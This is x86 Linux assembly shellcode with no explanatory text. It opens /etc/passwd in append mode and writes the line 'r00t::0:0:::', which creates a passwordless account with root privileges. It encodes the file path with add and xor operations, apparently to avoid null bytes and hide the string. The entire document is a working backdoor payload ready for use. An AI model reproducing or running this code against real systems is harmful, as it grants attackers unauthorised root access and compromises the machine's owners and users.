section .text

       global _start

  _start:

  ; open("/etc//passwd", O_WRONLY | O_APPEND)

       mov al, 5
       sub ecx, ecx
       push ecx
       mov ebx, 0x33333333
       mov edx, 0x31444040
       add edx, ebx
       push edx
       mov edx, 0x2e3cfbfc
       add edx, ebx
       push edx
       mov edx, 0x5047561c
       xor edx, ebx
       push edx
       mov ebx, esp
       mov cx, 02001Q
       int 0x80
       mov ebx, eax

  ; write(ebx, "r00t::0:0:::", 12)

       mov al, 4
       sub edx, edx
       push edx
       push 0x3a3a3a30
       push 0x3a303a3a
       push 0x74303072
       mov ecx, esp
       mov dl, 12
       int 0x80

  ; close(ebx)

       mov al, 6
       int 0x80

  ; exit()

       sub eax, eax
       inc eax
       int 0x80
